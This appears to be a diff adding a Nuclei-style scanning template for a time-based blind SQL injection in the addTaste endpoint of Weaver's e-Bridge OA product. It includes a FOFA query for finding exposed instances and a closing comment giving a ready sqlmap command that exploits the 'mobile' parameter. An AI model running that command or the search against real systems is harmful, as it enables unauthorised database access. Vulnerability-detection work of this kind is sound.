@@ -1,0 +1,30 @@
+id: fanwei-ebridge-addtaste-sqli
+
+info:
+  name: 泛微云桥前台addtaste Mysql时间盲注漏洞
+  author: pphua,xy
+  severity: high
+  description: 泛微云桥前台Mysql时间盲注漏洞，参数在mobile
+  reference: 
+    - https://mp.weixin.qq.com/s/biCiA1XKKUbMI28_JMU_dA
+  tags: fanwei,ebridge,sqli,oa
+  metadata: 
+    fofa-query: app="泛微-云桥e-Bridge"
+    max-request: 1
+    veified: true
+
+http:
+  - raw:
+    - |
+      GET /taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1 HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains((body_1), 'licenseWeworkCount') && contains(header_1, 'application/json')"
+
+#sqlmap语句：python3 sqlmap.py -u "http://x.x.x.x/taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1*" --random-agent --dbms mysql --technique T --level 5
+#注意，不确定数据库为mysql的情况下可以将 --dbms mysql 参数去掉
